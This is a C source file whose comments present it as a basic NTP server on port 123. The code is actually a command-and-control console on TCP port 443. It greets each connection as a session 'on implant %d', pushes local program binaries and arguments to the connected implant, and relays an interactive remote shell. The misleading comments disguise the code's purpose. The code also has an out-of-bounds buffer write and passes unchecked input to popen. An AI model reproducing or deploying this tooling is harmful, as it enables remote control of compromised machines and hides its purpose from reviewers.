// Basic NTP server
// 1. Create socket
// 2. Bind socket to port 123
// 3. Listen for incoming connections
// 4. Accept incoming connection
// 5. Receive NTP packet
// 6. Parse NTP packet
// 7. Print NTP packet
// 8. Send NTP packet
// 9. Close connection
// 10. Exit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>


int main() {
    int sockfd;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t cliaddr_len = sizeof(cliaddr);
    char buffer[1024];
    int id;

    // Bind socket to port 443
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Error creating socket");
        return 1;
    }
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
    servaddr.sin_port=htons(443);

    if(bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        printf("Error binding socket");
        return 1;
    }

    // Listen for incoming connections
    while (1) {
        if(listen(sockfd, 1) < 0){
            perror("Problem while listening");
            continue;
        }
        // Accept incoming connection:
        int conn = accept(sockfd, (struct sockaddr*)&cliaddr, &cliaddr_len);
        if(conn < 0){
            perror("Problem while accepting connection");
            continue;
        }
        // Receive header packet
        int recv_len = recvfrom(conn, &id, 4, 0, (struct sockaddr*)&cliaddr, &cliaddr_len);
        if(recv_len < 0){
            perror("Problem while receiving message");
            continue;
        }
        
        printf("####################################################################\n");
        printf("############# Connected to session 0 on implant %d ##############\n", id);
        printf("####################################################################\n");
        printf("\n\n");
        printf("(#%05d)> ", id);
        fflush(stdout);
        // Input command
        char* line = NULL;
        size_t len = 0;
        getline(&line, &len, stdin);

        line[strlen(line) - 1] = '\0';

        char* args = malloc(strlen(line) + 1);
        strcpy(args, line);
        char* file = strtok(line, " ");
        int args_len = strlen(args) + 1;

        FILE *pp;
        char path[1024];
        char which[1024];

        /* Open the command for reading. */
        sprintf(which, "/bin/which %s", file);
        pp = popen(which, "r");
        if (pp == NULL) {
            printf("Failed to find command %s\n", file);
            continue;
        }

        if (fgets(path, sizeof(path), pp) == NULL) {
            printf("Failed to find command %s\n", file);
            continue;
        }

        pclose(pp);
        path[strlen(path) - 1] = '\0';
        FILE *fp = fopen(path, "r");
        if (fp == NULL) {
            printf("Error opening file %s\n", path);
            continue;
        }

        fseek(fp, 0, SEEK_END);
        int data_len = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        // Send header packet
        int lengths[2] = {args_len, data_len};
        sendto(conn, lengths, 8, 0, (struct sockaddr*)&cliaddr, cliaddr_len);

        // Send the arguments packet
        sendto(conn, args, args_len, 0, (struct sockaddr*)&cliaddr, cliaddr_len);

        char* data_buf = malloc(data_len);

        fread(data_buf, 1, data_len, fp);
        fclose(fp);

        // Send the data packet
        int sent = 0;
        while (data_len > 1024) {
            sent = sendto(conn, data_buf, 1024, 0, (struct sockaddr*)&cliaddr, cliaddr_len);
            if (sent < 0) {
                perror("Error sending data");
                break;
            }
            data_len -= sent;
            data_buf += sent;
        }
        sent = sendto(conn, data_buf, data_len, 0, (struct sockaddr*)&cliaddr, cliaddr_len);
        if (sent < 0) {
            perror("Error sending data");
        }

        // interactive loop
        // Open two forks: one for receiving and one for sending
        int connected = 1;
        if (fork()) {
            while (connected) {
                // Receive data
                int recv_len = recvfrom(conn, buffer, 1024, 0, (struct sockaddr*)&cliaddr, &cliaddr_len);
                if(recv_len < 0){
                    perror("Problem while receiving message");
                    connected = 0;
                    continue;
                }
                if (recv_len == 0) {
                    connected = 0;
                    break;
                }
                buffer[recv_len] = '\0';
                printf("%s", buffer);
                fflush(stdout);
            }
        } else {
            while (connected) {
                // Send data
                char* line = NULL;
                size_t len = 0;
                getline(&line, &len, stdin);
                line[strlen(line) - 1] = '\0';
                int sent = sendto(conn, line, strlen(line), 0, (struct sockaddr*)&cliaddr, cliaddr_len);
                if (sent < 0) {
                    connected = 0;
                    perror("Error sending data");
                }
            }
        }
        printf("Done!\n");
    }

}